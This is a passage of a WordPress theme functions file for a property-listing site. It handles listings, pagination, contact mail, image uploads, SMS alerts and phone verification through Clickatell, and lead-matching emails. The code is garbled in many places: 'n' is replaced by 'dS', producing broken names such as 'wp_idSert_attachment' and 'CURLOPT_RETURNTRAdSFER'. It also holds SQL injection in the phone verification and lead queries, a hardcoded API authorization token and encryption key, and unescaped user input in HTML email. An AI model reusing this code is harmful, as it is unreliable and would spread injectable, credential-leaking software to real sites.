				else echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-385-260.jpg" alt="thumbnail">';
				$project_status = get_field('sold_under_contract');
				if ($project_status == 1 || $project_status == 2) {
?>
                        <div class="tradSparent-strip">
                            <?php
					if ($project_status == 1) echo "Sold";
					elseif ($project_status == 2) echo "In Contract";
?>
                        </div>
                        <?php
				}

				$price = get_field("listing_price");
				$per_square = $price / $building_size;
?>
                        <div class="prperty-p">$
                            <?php
				echo number_format($price); ?> <span>
                                <?php
				echo number_format($per_square); ?> / sq. ft. </span></div>
                    </div>
                    <div class="prperty-cnt">
                        <div class="pro-n">
                            <?php
				the_title(); ?> <span>
                                <?php
				the_field("city"); ?>,
                                <?php
				the_field("zip_code"); ?></span> </div>
                        <div class="prperty-des"> <span>Beds:
                                <?php
				the_field("bedrooms"); ?></span> <span>Baths:
                                <?php
				the_field("bathrooms"); ?></span> <span>Sq Ft.
                                <?php
				echo (!empty($building_size)) ? number_format($building_size) : ''; ?></span> </div>
                        <?php
				$state = get_field("state");
?>
                        <div class="prperty-des"> <span>
                                <?php
				echo $state->name; ?></span> </div>
                        <div class="detail-btn"> <a href="<?php
				the_permalink(); ?>">Details</a> </div>
                    </div>
                    <?php
				$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
                    <div class="prperty-des2"> <span><i class="fa fa-user" aria-hidden="true"></i>
                            <?php
				echo $user_info->user_firstname; ?>
                            <?php
				echo $user_info->user_lastname; ?> </span> <span class="pull-right"><i class="fa fa-calendar" aria-hidden="true"></i>
                            <?php
				the_time(); ?></span> </div>
                </li>
                <?php
			endwhile;
			if (function_exists("pagination")) {
				pagination($my_query->max_num_pages, '', $paged);
			}

?>
            </ul>
            <?php
		}
		else { ?>
            <div class="property-listing">
                <h3 class="no_property">No Property Found</h3>
            </div>
            <?php
		}

		wp_reset_postdata();
?>
        </div>
    </div>
</div>
<style>
    .property_listing {
        margin: 0 !important;
    }
</style>
<?php
	}

	exit();
}

add_action('wp_ajax_filter_properties', 'filter_properties');
add_action('wp_ajax_nopriv_filter_properties', 'filter_properties');

function pagination($pages = '', $tab=null, $paged=null, $range = 4)
{
	$showitems = ($range * 2) + 1;
	if (empty($paged)) $paged = 1;
	if ($pages == '') {
		global $wp_query;
		$pages = $wp_query->max_num_pages;
		if (!$pages) {
			$pages = 1;
		}
	}

	if (1 != $pages) {
		echo "<div class=\"pagination\"><span>Page " . $paged . " of " . $pages . "</span>";
		if ($paged > 2 && $paged > $range + 1 && $showitems < $pages) echo "<a href='" . get_pagenum_link(1) . "' data-paged='1' data-tab='" . $tab . "' class='inactive'>&laquo; First</a>";
		if ($paged > 1 && $showitems < $pages) echo "<a href='" . get_pagenum_link($paged - 1) . "' data-paged='" . ($paged - 1) . "' data-tab='" . $tab . "' class='inactive'>&lsaquo; Previous</a>";
		for ($i = 1; $i <= $pages; $i++) {
			if (1 != $pages && (!($i >= $paged + $range + 1 || $i <= $paged - $range - 1) || $pages <= $showitems)) {
				echo ($paged == $i) ? "<span class=\"current\">" . $i . "</span>" : "<a href='" . get_pagenum_link($i) . "' class=\"inactive\" data-paged='" . $i . "' data-tab='" . $tab . "'>" . $i . "</a>";
			}
		}

		if ($paged < $pages && $showitems < $pages) 
			echo "<a href=\"" . get_pagenum_link($paged + 1) . "\" data-paged='" . ($paged + 1) . "' data-tab='" . $tab . "' class='inactive'>Next &rsaquo;</a>";
		if ($paged < $pages - 1 && $paged + $range - 1 < $pages && $showitems < $pages) echo "<a href='" . get_pagenum_link($pages) . "' data-paged='" . $pages . "' data-tab='" . $tab . "' class='inactive'>Last &raquo;</a>";
		echo "</div>\n";
	}
}

add_action('wp_ajax_pagination', 'pagination');

// Add a custom agent role

$result = add_role('agent', __('Agent') , array());
add_action('after_setup_theme', 'remove_admin_bar');

function remove_admin_bar()
{
	if (!current_user_can('administrator') && !is_admin()) {
		show_admin_bar(false);
	}
}

function request_property_info()
{
	$name = $_POST['name'];
	$email = $_POST['email'];
	$phone = $_POST['phone'];
	$message = $_POST['message'];
	$agent = $_POST['agent'];
	$property = $_POST['property'];
	$author_info = get_userdata($agent);
	if (!empty($property)) {
		$heading = 'Following user wants to contact you regarding ' . $property . ' property, user details given below:';
	}
	else {
		$heading = 'Following user wants to contact you, user details given below:';
	}

	$body = '<table border="0" cellpadding="0" cellspacing="0" style="width:650px">
				<tbody>
					<tr>
						<td scope="col">
						<table border="0" cellpadding="10" cellspacing="0" style="border-bottom:1px solid #cccccc; height:80px; width:650px">
							<tbody>
								<tr>
									<td scope="col"><a href="' . get_site_url() . '" target="_blank"><img alt="" src="' . get_field('email_logo', 'option') . '" style="height:200px; width:200px" /></a></td>
								</tr>
							</tbody>
						</table>
			
						<table border="0" cellpadding="10" cellspacing="0" style="width:650px">
							<tbody>
								<tr>
									<td scope="col">
									<table border="0" cellpadding="10" cellspacing="0" style="width:610px">
										<tbody>
											<tr>
												<td scope="col"><strong>Hi ' . $author_info->first_name . ' ' . $author_info->last_name . ',</strong></td>
											</tr>
											<tr>
												<td scope="col"><span style="font-size:14px">' . $heading . '</span></td>
											</tr>
											<tr>
												<td scope="col"><span style="font-size:14px">Name : ' . $name . '</span><br />												
												<span style="font-size:14px">Email : ' . $email . '</span><br />
												<span style="font-size:14px">Phone : ' . $phone . '</span><br />
												<span style="font-size:14px">Message : ' . $message . '</span></td>
											</tr>
											<tr>
												<td scope="col">Thanks</td>
											</tr>
											<tr>
												<td scope="col"><strong>' . get_bloginfo() . '<br />
												<a href="' . get_site_url() . '">' . get_site_url() . '</a></strong></td>
											</tr>
										</tbody>
									</table>
									</td>
								</tr>
							</tbody>
						</table>
			
						<table align="center" border="0" cellpadding="10" cellspacing="0" style="width:650px">
							<tbody>
								<tr>
									<td scope="col"><em>Please do not reply to this email as this is an automated respodSe from ' . get_bloginfo() . '.</em></td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
				</tbody>
			</table>';
	$to = $author_info->user_email;
	$subject = 'Property Request Info';
	$headers = array(
		'Content-Type: text/html; charset=UTF-8',
		'From: WOLF PROPERTIES <admin@wolfprop.com>'
	);
	if (wp_mail($to, $subject, $body, $headers)) {
		$respodSe['success'] = true;
		$respodSe['message'] = "Thank you for your message. It has been sent.";
	}
	else {
		$respodSe['success'] = false;
		$respodSe['message'] = "There was an error trying to send your message. Please try again later.";
	}

	echo json_encode($respodSe);
	die;
}

add_action('wp_ajax_request_property_info', 'request_property_info');
add_theme_support('post-thumbnails');
add_image_size('detail-thumb', 1156, 581, true);
add_image_size('slide-thumb', 1024, 683, true);
add_image_size('home-thumb', 1350, 650, true);
add_image_size('list-thumb', 255, 170, true);
add_image_size('grid-thumb', 385, 260, true);
add_image_size('blog-thumb', 90, 90, true);

// add 30 + plus listing end date for rental and sale property

add_action('save_post_sale-listing', 'save_my_metadata');

function save_my_metadata($ID = false, $post = false)
{
	$listing_end_status = get_post_meta($ID, 'listing_end_status', true);
	if ($listing_end_status != "update") {
		if (!empty($_POST['fields']['field_58204cf6e5605'])) $listing_date = $_POST['fields']['field_58204cf6e5605'];
		else $listing_date = $_POST['fields']['listing_date'];
		date("Y-m-d", $listing_date);
		$days = 30;
		$listing_end = strtotime("+" . $days . " days", strtotime($listing_date));
		$listing_end = date("Y-m-d", $listing_end);
		update_post_meta($ID, 'listing_end', $listing_end);
		update_post_meta($ID, 'listing_end_status', 'update');
	}

	if (!empty($_POST['fields']['field_58204d2ae5607'])) $listing_status = $_POST['fields']['field_58204d2ae5607'];
	else $listing_status = $_POST['fields']['listing_status'];
	$last_status = get_post_meta($ID, 'listing_status', true);
	if ($last_status != "Sold" && $listing_status == "Sold") {
		update_post_meta($ID, 'listing_rentedsold_date', date("Y-m-d"));
	}
}

add_action('save_post_rental-listing', 'save_my_metadata1');

function save_my_metadata1($ID = false, $post = false)
{
	$listing_end_status = get_post_meta($ID, 'listing_end_status', true);
	if ($listing_end_status != "update") {
		if (!empty($_POST['fields']['field_58204cf6e5605'])) $listing_date = $_POST['fields']['field_58204cf6e5605'];
		else $listing_date = $_POST['fields']['listing_date'];
		date("Y-m-d", $listing_date);
		$days = 30;
		$listing_end = strtotime("+" . $days . " days", strtotime($listing_date));
		$listing_end = date("Y-m-d", $listing_end);
		update_post_meta($ID, 'listing_end', $listing_end);
		update_post_meta($ID, 'listing_end_status', 'update');
	}

	if (!empty($_POST['fields']['field_58204d2ae5607'])) $listing_status = $_POST['fields']['field_58204d2ae5607'];
	else $listing_status = $_POST['fields']['listing_status'];
	$last_status = get_post_meta($ID, 'listing_status', true);
	if ($last_status != "Rented" && $listing_status == "Rented") {
		update_post_meta($ID, 'listing_rentedsold_date', date("Y-m-d"));
	}
}

// thumbnail image upload

add_action('wp_ajax_upload_images', 'upload_images_callback');
add_action('wp_ajax_nopriv_upload_images', 'upload_images_callback');

if (!function_exists('upload_images_callback')):
	function upload_images_callback()
	{
		$data = array();
		$attachment_ids = array();
		if (isset($_POST['nonce']) && wp_verify_nonce($_POST['nonce'], 'image_upload')) {
			$files = reArrayFiles($_FILES['files']);
			if (empty($_FILES['files'])) {
				$data['status'] = false;
				$data['message'] = __('Please select an image to upload!', 'twentysixteen');
			}
			elseif ($files[0]['size'] > 5242880) { // Maximum image size is 5M
				$data['size'] = $files[0]['size'];
				$data['status'] = false;
				$data['message'] = __('Image is too large. It must be less than 2M!', 'twentysixteen');
			}
			else {
				$i = $_POST['count'];
				$data['message'] = '';
				foreach($files as $file) {
					if (is_array($file)) {
						$attachment_id = upload_user_file($file, false);
						if (is_numeric($attachment_id)) {
							$img_thumb = wp_get_attachment_image_src($attachment_id, 'thumbnail');
							$data['status'] = true;
							$data['message'].= '<li id="attachment-' . $i . '">
 									<div class="attachment"><input type="hidden" name="fields[property_photos_' . $i . '_photo]" value="' . $attachment_id . '">
									<input type="hidden" name="fields[_property_photos_' . $i . '_photo]" value="field_58204f93d2f01">
									<img src="' . $img_thumb[0] . '" alt="" /></div>
									<div class="attachment"><input type="radio" name="feature_image" value="' . $attachment_id . '"></div>
									<div class="attachment"><a href="javascript:void(0)" class="btn-default btn-default-blue remove_attach" data-attachment="' . $i . '">Remove</a></div>
									<input type="hidden" name="fields[property_photos]" value="' . ++$i . '">	
						</li>';
							$attachment_ids[] = $attachment_id;
						}
					}
				}

				if (!$attachment_ids) {
					$data['status'] = false;
					$data['message'] = __('An error has occured. Your image was not added.', 'twentysixteen');
				}
			}
		}
		else {
			$data['status'] = false;
			$data['message'] = __('Nonce verify failed', 'twentysixteen');
		}

		echo json_encode($data);
		die();
	}

endif;
/**
 * Rearray $_FILES array for easy use
 *
 */

if (!function_exists('reArrayFiles')):
	function reArrayFiles(&$file_post)
	{
		$file_ary = array();
		$file_count = count($file_post['name']);
		$file_keys = array_keys($file_post);
		for ($i = 0; $i < $file_count; $i++) {
			foreach($file_keys as $key) {
				$file_ary[$i][$key] = $file_post[$key][$i];
			}
		}

		return $file_ary;
	}

endif;

if (!function_exists('upload_user_file')):
	function upload_user_file($file = array() , $title = false)
	{
		require_once ABSPATH . 'wp-admin/includes/admin.php';

		$file_return = wp_handle_upload($file, array(
			'test_form' => false
		));
		if (isset($file_return['error']) || isset($file_return['upload_error_handler'])) {
			return false;
		}
		else {
			$filename = $file_return['file'];
			$attachment = array(
				'post_mime_type' => $file_return['type'],
				'post_content' => '',
				'post_type' => 'attachment',
				'post_status' => 'inherit',
				'guid' => $file_return['url']
			);
			if ($title) {
				$attachment['post_title'] = $title;
			}

			$attachment_id = wp_idSert_attachment($attachment, $filename);
			require_once (ABSPATH . 'wp-admin/includes/image.php');

			$attachment_data = wp_generate_attachment_metadata($attachment_id, $filename);
			wp_update_attachment_metadata($attachment_id, $attachment_data);
			if (0 < intval($attachment_id)) {
				return $attachment_id;
			}
		}

		return false;
	}

endif;
/**************************************/

// thumbnai image upload

add_action('the_excerpt_max_charlength', 'the_excerpt_max_charlength');

function the_excerpt_max_charlength($charlength)
{
	$excerpt = get_the_content();
	$charlength++;
	if (mb_strlen($excerpt) > $charlength) {
		$subex = mb_substr($excerpt, 0, $charlength - 5);
		$exwords = explode(' ', $subex);
		$excut = - (mb_strlen($exwords[count($exwords) - 1]));
		if ($excut < 0) {
			echo mb_substr($subex, 0, $excut);
		}
		else {
			echo $subex;
		}
	}
	else {
		echo $excerpt;
	}
}

//add_action('init', 'myStartSession', 1);

function ur_theme_start_session()
{
	if (!session_id()) session_start();
}

add_action("init", "ur_theme_start_session", 1);
add_action('tradSition_post_status', 'a_new_post', 10, 3);

function a_new_post($new_status, $old_status, $post)
{
	if ('publish' !== $new_status or 'publish' === $old_status or 'trash' === $old_status) {
		return;
	}

	if (in_array($post->post_type, array(
		'sale-listing'
	))) {
		$myfile = fopen("clickatelllogs.txt", "a+") or die("Unable to open file!");

		// tinny url

		$url = get_the_permalink($post->ID);
		$ch = curl_init();
		$timeout = 5;
		curl_setopt($ch, CURLOPT_URL, 'http://tinyurl.com/api-create.php?url=' . $url);
		curl_setopt($ch, CURLOPT_RETURNTRAdSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		$tinnyurl = curl_exec($ch);
		curl_close($ch);
		if ($post->post_type == 'sale-listing') {
			$type = "For Sale";
		}
		else {
			$type = "For Rent";
		}

		$message['content'] = get_field('clickatell_new_property_alert_message', 'option');
		$message['content'] = str_replace("##title##", $post->post_title, $message['content']);
		$message['content'] = str_replace("##url##", $tinnyurl, $message['content']);
		$message['content'] = str_replace("##type##", $type, $message['content']);
		global $wpdb;
		$table_name = $wpdb->prefix . "phone_texting";
		$result = $wpdb->prepare("SELECT distinct phone_number FROM wp_clickatell_group g, wp_clickatell_group_phonenumber gp, wp_phone_texting pt WHERE g.alert =1 AND g.id = gp.group_id AND gp.phone_number_id = pt.id AND pt.status =1");
		$phone_numbers = $wpdb->get_col($result);
		$phone_chunk = array_chunk($phone_numbers, 200);
		foreach($phone_chunk as $group) {
			fwrite($myfile, "\n" . $post->post_title);
			$message['to'] = $group;
			$message['from'] = get_field('clickatell_reply_phone_number', 'option');;
			$message_json = json_encode($message);

			// clickatell api to send message

			$curl = curl_init();
			curl_setopt_array($curl, array(
				CURLOPT_URL => "https://platform.clickatell.com/messages",
				CURLOPT_RETURNTRAdSFER => true,
				CURLOPT_ENCODING => "",
				CURLOPT_MAXREDIRS => 10,
				CURLOPT_TIMEOUT => 30,
				CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
				CURLOPT_CUSTOMREQUEST => "POST",
				CURLOPT_POSTFIELDS => $message_json,
				CURLOPT_HTTPHEADER => array(
					"accept: application/json",
					"authorization: UYhYjXTqRC6vUpiuI207Dg==",
					"cache-control: no-cache",
					"content-type: application/json",
					"postman-token: 6df14129-77a3-bb4f-c4db-89b65218e02c"
				) ,
			));
			$respodSe = curl_exec($curl);
			$err = curl_error($curl);
			curl_close($curl);
			if ($err) {
				echo "cURL Error #:" . $err;
				fwrite($myfile, "\n" . "cURL Error #:" . $err);
			}
			else {
				echo $respodSe;
				fwrite($myfile, "\n" . $respodSe);
			}
		}
	}
	else {
		return; // restrict the filter to a specific post type
	}

	fclose($myfile);

	// do something awesome

}

function posts_for_current_author($query)
{
	$user = wp_get_current_user();
	if (in_array('agent', (array)$user->roles)) {
		if ($query->query['post_type'] == "prospect") {
			global $user_ID;
			$query->set('meta_query', array(
				array(
					'key' => 'prospect_source',
					'value' => $user_ID,
					'compare' => '=',
					'type' => 'numeric'
				)
			));
		}
	}

	return $query;
}

add_filter('pre_get_posts', 'posts_for_current_author');
add_action("wp_ajax_texting-signup", "add_phone_number");
add_action('wp_ajax_nopriv_texting-signup', 'add_phone_number');

function add_phone_number()
{
	global $wpdb;
	$phone_number = preg_replace('/\D+/', '', $_POST['text']);
	$phone_number = "+1" . $phone_number;
	$ip = $_SERVER['REMOTE_ADDR'];
	$code = rand(111111, 999999);
	$table_name = $wpdb->prefix . "phone_texting";
	$rowcount = $wpdb->get_var("SELECT COUNT(*) FROM $table_name WHERE phone_number = $phone_number and status = 1");
	if ($rowcount == 0) {
		$pending = $wpdb->get_var("SELECT COUNT(*) FROM $table_name WHERE phone_number = $phone_number");
		if ($pending == 0) {
			$retun = $wpdb->idSert($table_name, array(
				'phone_number' => $phone_number,
				'ip' => $ip,
				'code' => $code,
				'created' => date("Y-m-d H:i:s") ,
				'modified' => date("Y-m-d H:i:s")
			));
		}
		else {
			$retun = $wpdb->update($table_name, array(
				'ip' => $ip,
				'code' => $code,
				'modified' => date("Y-m-d H:i:s")
			) , array(
				'phone_number' => $phone_number
			));
		}

		if ($retun) {
			$message['content'] = get_field('clickatell_signup_message', 'option');
			$message['content'] = str_replace("##verficationcode##", $code, $message['content']);
			$message['to'] = array(
				$phone_number
			);
			$message['from'] = get_field('clickatell_reply_phone_number', 'option');;
			$message_json = json_encode($message);
			$myfile = fopen("clickatelllogs.txt", "a+") or die("Unable to open file!");

			// clickatell api to send message

			$curl = curl_init();
			curl_setopt_array($curl, array(
				CURLOPT_URL => "https://platform.clickatell.com/messages",
				CURLOPT_RETURNTRAdSFER => true,
				CURLOPT_ENCODING => "",
				CURLOPT_MAXREDIRS => 10,
				CURLOPT_TIMEOUT => 30,
				CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
				CURLOPT_CUSTOMREQUEST => "POST",
				CURLOPT_POSTFIELDS => $message_json,
				CURLOPT_HTTPHEADER => array(
					"accept: application/json",
					"authorization: UYhYjXTqRC6vUpiuI207Dg==",
					"cache-control: no-cache",
					"content-type: application/json",
					"postman-token: 6df14129-77a3-bb4f-c4db-89b65218e02c"
				) ,
			));
			$curlexec = curl_exec($curl);
			$err = curl_error($curl);
			curl_close($curl);
			if ($err) {
				$respodSe['status'] = false;
				$respodSe['message'] = "<p class='alert'>Something went wrong, please try again later.</p>";
				fwrite($myfile, "\n" . "cURL Error #:" . $err);
			}
			else {
				fwrite($myfile, "\n" . $curlexec);
				$respodSe['status'] = true;
				$respodSe['verify'] = "<form id='verifyphone'>";
				$respodSe['verify'].= "<div class='col-sm-12 pad0'><div class='form-group'><input type='text' class='' id='verfication_code' name='verfication_code' placeholder='Verification Code' required=''>";
				$respodSe['verify'].= "<input type='hidden' id='verification_number' name='verification_number' value='" . $_POST['text'] . "' ><input type='hidden' name='action' value='verify_phone' >";
				$respodSe['verify'].= "<input type='submit' value='Verify' id='submitverification' class='btn btn-default'></div></div></form><div class='col-sm-12 pad0'><p class='pull-left'>Verification code has been sent to this number: " . $_POST['text'] . "</p><a href='#' id='resendotp' class='pull-right'>Resend Verification Code</a></div><div class='respodSe1'></div>";
			}
		}
		else {
			$respodSe['status'] = false;
			$respodSe['message'] = "<p class='alert'>Something went wrong, please try again later.</p>";
		}
	}
	else {
		$respodSe['status'] = false;
		$respodSe['message'] = "<p class='alert'>Phone number is already subscribed.</p>";
	}

	echo json_encode($respodSe);
	die;
}

add_action("wp_ajax_verify_phone", "verify_phone");
add_action('wp_ajax_nopriv_verify_phone', 'verify_phone');

function verify_phone()
{
	global $wpdb;
	$phone_number = $_POST['verification_number'];
	$phone_number = "+1" . $phone_number;
	$code = $_POST['verfication_code'];
	$table_name = $wpdb->prefix . "phone_texting";
	$rowcount = $wpdb->get_var("SELECT COUNT(*) FROM $table_name WHERE phone_number = $phone_number and code = $code");
	$id = $wpdb->get_var("SELECT id FROM $table_name WHERE phone_number = $phone_number and code = $code");
	if ($rowcount == 1) {
		$retun = $wpdb->update($table_name, array(
			'code' => '',
			'status' => 1,
			'modified' => date("Y-m-d H:i:s")
		) , array(
			'phone_number' => $phone_number
		));
		if ($retun) {
			$respodSe['status'] = true;
			$respodSe['message'] = '<div class="text-center midd-content newsletter-signup">
                  <img src="' . get_template_directory_uri() . '/images/newsletter-confirm.png" alt="texting_confirmation">
                <p style="margin-top:10px;">You have successfully subscribed to our newsletter or requested text message notificatiodS for new sales listings. For email subscribers, you will receive a confirmation email shortly. Please follow the link contained within the email to confirm your subscription. We recommend checking your spam folder if the email takes more than 15 minutes to appear in your mailbox.</p>
            </div>';
			$table_name1 = $wpdb->prefix . "clickatell_group_phonenumber";
			$wpdb->idSert($table_name1, array(
				'group_id' => 1,
				'phone_number_id' => $id,
				'created' => date("Y-m-d H:i:s") ,
				'modified' => date("Y-m-d H:i:s")
			));
		}
		else {
			$respodSe['status'] = false;
			$respodSe['message'] = "<p class='alert'>Verification code does not match.</p>";
		}
	}
	else {
		$respodSe['status'] = false;
		$respodSe['message'] = "<p class='alert'>Verification code does not match.</p>";
	}

	echo json_encode($respodSe);
	die;
}
$add_meta_box_in = array ( 'sale-listing', 'rental-listing' );

function add_wpdocs_meta_box() {
  	add_meta_box(
		'wpt_events_location',
		'Agent Listing',
		'wpdocs_metabox_callback',
		$add_meta_box_in,
		'side',
		'default'
	);
}
function wpdocs_metabox_callback( $post, $metabox ) { 
	$args  = array(
		'role'      => 'agent',
		'orderby'   => 'display_name',
		'fields'    => 'all_with_meta',
		'number'    => $users_per_page,
		'offset'    => $offset
    );
    $wp_user_query = new WP_User_Query($args);
    $authors = $wp_user_query->get_results();
    $post_ID = get_the_ID();
    $agent_ID = get_post_meta($post_ID,'agent', true);
	?>
    <select class="selectbox" name="agent">
    	<?php foreach ($authors as $author) { 
    		$author_info = get_userdata($author->ID); ?>
    		<option value="<?php echo $author->ID; ?>" <?php if($agent_ID == $author->ID): echo 'selected '; endif; ?>> 
    			<?php echo $author_info->first_name; ?> <?php echo $author_info->last_name; ?>
			</option>
    	<?php } ?>
    </select>
<?php }
add_action( 'add_meta_boxes', 'add_wpdocs_meta_box' ); 

function agent_save_postdata($post_id)
{
    if (array_key_exists('agent', $_POST)) {
        update_post_meta(
            $post_id,
            'agent',
            $_POST['agent']
        );
    }
}
add_action('save_post', 'agent_save_postdata');

// Custom code 

add_action( 'admin_menu', 'manage_leads' );
function manage_leads() {
	add_menu_page( 'manage_leads', 'Manage Leads', 'read', site_url().'/laravel/leads', '', 'dashicons-text', 27 );
}
/**
 * Adding bridge cookie to access laravel
 */
function wolf_add_bridge_cookie( $auth_cookie, $expire, $expiration, $user_id, $scheme, $token ){
	$is_secure = $scheme == 'secure_auth';

	// Setting up bridge cookie.

	// Store the cipher method 
	$ciphering = "AES-128-CTR"; 
	  
	// Use OpenSSl Encryption method 
	$iv_length = openssl_cipher_iv_length($ciphering); 
	$options = 0; 
	  
	// Non-NULL Initialization Vector for encryption 
	$encryption_iv = '0409259094437408'; 
	  
	// Store the encryption key 
	$encryption_key = "WolfPropertyWordpressLaravel"; 
	  
	// Use openssl_encrypt() function to encrypt the data 
	$user_id = openssl_encrypt($user_id, $ciphering, 
				$encryption_key, $options, $encryption_iv); 

	setcookie( 'bridge_cookie', $user_id, $expire, COOKIEPATH, COOKIE_DOMAIN, $is_secure, true );
}
add_action( 'set_auth_cookie', 'wolf_add_bridge_cookie', 10, 6 );

/**
 * Removing bridge cookie to access laravel
 */
function wolf_remove_bridge_cookie(){
	// Removing bridge cookie.
	unset($_COOKIE['bridge_cookie']); 
    setcookie('bridge_cookie', null, -1, COOKIEPATH, COOKIE_DOMAIN); 
}
add_action( 'wp_logout', 'wolf_remove_bridge_cookie' );

function after_task_post_created($post_id) {
	//no action if post type not sale-listing and rental-listing
	if (get_post_type($post_id) != 'sale-listing' && get_post_type($post_id) != 'rental-listing')
	return;
	// If this is a revision, don't send the email.
	if ( wp_is_post_revision( $post_id ) )
	return;

	// if post not yet published so no action taken, i know it can be confused
	if (get_post_status($post_id) != 'publish' )
	return;

	global $wpdb;
	$post_data = get_post($post_id);
	$meta_data = get_post_meta($post_id);
	$neighbourhood_data = wp_get_object_terms($post_id,"neighbourhood");
	
	if ($post_data->post_date == $post_data->post_modified)
	{
		$endExist = false;
		$qry = "select leads.id, leads.user_id,wp_users.user_email,wp_users.user_login from leads INNER JOIN wp_users
		ON leads.user_id = wp_users.ID where ";
		if($meta_data && $meta_data['bedrooms'] && $meta_data['bedrooms'][0]){
			$bedroomId = $wpdb->get_row("SELECT id FROM bedrooms WHERE bedroom = ".$meta_data['bedrooms'][0]);
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
		if($bedroomId->id)
			$qry .= " (select * from `lead_bedrooms` where `leads`.`id` = `lead_bedrooms`.`lead_id` and `bedroom_id` = ".$bedroomId->id.")";
		
		}
		if($meta_data && $meta_data['bathrooms'] && $meta_data['bathrooms'][0]){
			$bathroomId = $wpdb->get_row("SELECT id FROM bathrooms WHERE bathroom = ".$meta_data['bathrooms'][0]);
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
		if($bathroomId->id)
			$qry .= " (select * from `lead_bathrooms` where `leads`.`id` = `lead_bathrooms`.`lead_id` and `bathroom_id` = ".$bathroomId->id.")";	
		}
		if($meta_data && !empty($neighbourhood_data)){
			$idArr = [];
			foreach($neighbourhood_data as $ids){
					$idArr[] = $ids->term_id;	
			}
			if($idArr){
				$ids = join("','",$idArr);   
				$qry .=  $endExist ? ' and exists' : ' exists';
				$endExist = true;
				$qry .= " (select * from `lead_neighborhoods` where `leads`.`id` = `lead_neighborhoods`.`lead_id` and `neighborhood_id` IN ('$ids'))";	
			}
		}
		if($meta_data && $meta_data['pets'] && $meta_data['pets'][0]){
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
			$qry .= " (select * from `lead_details` where `leads`.`id` = `lead_details`.`lead_id` and `pet` = ".$meta_data['pets'][0].")";
		}
		/*if($meta_data && $meta_data['laundry'] && $meta_data['laundry'][0]){
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
			$qry .= " (select * from `lead_details` where `leads`.`id` = `lead_details`.`lead_id` and `laundry` = '".$meta_data['laundry'][0]."')";
		}*/
		if($meta_data && $meta_data['parking'] && $meta_data['parking'][0]){
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
			$qry .= " (select * from `lead_details` where `leads`.`id` = `lead_details`.`lead_id` and `parking` = ".$meta_data['parking'][0].")";
		}

		if($meta_data && $meta_data['zip_code'] && $meta_data['zip_code'][0]){
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
			$qry .= " (select * from `lead_details` where `leads`.`id` = `lead_details`.`lead_id` and `zipcode` = ".$meta_data['zip_code'][0].")";
		}
		
		/*if($meta_data && $meta_data['state_id'] && $meta_data['state_id'][0]){
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
			$qry .= " (select * from `lead_details` where `leads`.`id` = `lead_details`.`lead_id` and `state_id` = ".$meta_data['state_id'][0].")";
		}*/
		/*if($meta_data && $meta_data['city'] && $meta_data['city'][0]){
			$qry .=  $endExist ? ' and exists' : ' exists';
			$endExist = true;
			$qry .= " (select * from `lead_details` where `leads`.`id` = `lead_details`.`lead_id` and `city` = ".$meta_data['city'][0].")";
		}*/
		$qry .= ' GROUP BY user_id';
		//echo $qry; die;
		global $wpdb;
		$agentArr = $wpdb->get_results($qry);
	//$emailStatus = send_property_email_notification("dimpal@yopmail.com",$post_data,$meta_data);
			foreach($agentArr as $agent){
				$emailStatus = send_property_email_notification($agent,$post_data,$meta_data);
				if($emailStatus){
					$wpdb->insert('property_notifications', array(
						'property_id' => $post_id,
						'user_id' => $agent->user_id
						)
					);
				}
			}
	}
	
}
add_action('wp_insert_post', 'after_task_post_created');

function send_property_email_notification($receiverEmail,$postData,$metaData){
	//print_r($metaData);die;
	$to = isset($receiverEmail->user_email)?$receiverEmail->user_email:$receiverEmail;
	$subject = 'Newly Matched Property Created';
       $headers = array(
		'Content-Type: text/html; charset=UTF-8',
		'From: WOLF PROPERTIES <admin@wolfprop.com>'
	);
       $name= isset($receiverEmail->user_login)?$receiverEmail->user_login:'Agent name';
	$message .= "Hi ".ucwords(strtolower($name)).",<br><br>";
	 $message .= "New Property has been published.<br> Property Title : ".$postData->post_title."<br>";
	 $message .= 'This property  meets your leads searching criteria <a target="_blank" href="'.get_site_url().'/'.$postData->post_type.'/'. $postData->post_name.'" class="btn btn-black">Click Here</a> for property detail information';
	
	$html='<div>
<table align="center" cellpadding="0" cellspacing="0" style="border:1px solid #dddddd;" width="650">
	<tbody>
		<tr>
			<td>
			<table cellpadding="0" cellspacing="0" style="background:#971425;color:#ffffff; border-bottom:1px solid #dddddd; padding:15px;" width="100%">
				<tbody>
					<tr>
						<td><a href="'.get_site_url().'" target="_blank" style="color: #fff;font-size: 20px;text-decoration-line: none;"><img alt="" border="0" src="https://wolfproperties.projectstatus.in/laravel/logo.png" /></a></td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
		<tr>
			<td style="background:#ffffff; padding:15px;">
			<table cellpadding="0" cellspacing="0" width="100%">
				<tbody>
					<tr>
						<td style="font-family:\'Trebuchet MS\', Arial, Helvetica, sans-serif; color:#000000; font-size:16px;">
							'.$message.'
						</td>
					</tr>
					<tr>
						<td style="font-family:\'Trebuchet MS\', Arial, Helvetica, sans-serif; color:#043f8d; font-size:16px; vertical-align:middle; text-align:left; padding-top:20px;">
						Regards,<br> Wolf Properties Team
						</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
		<tr>
			<td style="background:#971425; border-top:1px solid #dddddd; text-align:center; font-family:\'Trebuchet MS\', Arial, Helvetica, sans-serif; color:#ffffff; padding:12px; font-size:12px; text-transform:uppercase; font-weight:normal;">Wolf Properties copyright 2020 All Rights Reserved.</td>
		</tr>
	</tbody>
</table>
</div>';

	
	//wp_mail( "dimpal@yopmail.com", $subject, $html, $headers );

	$emailStatus = false;
	$emailStatus = wp_mail( $to, $subject, $html, $headers );

	return $emailStatus;
}

function custom_remove_user( $user_id ) {
	global $wpdb;
	$wpdb->update('leads', array(
		'user_id' => NULL
	) , array(
		'user_id' => $user_id
	));
	
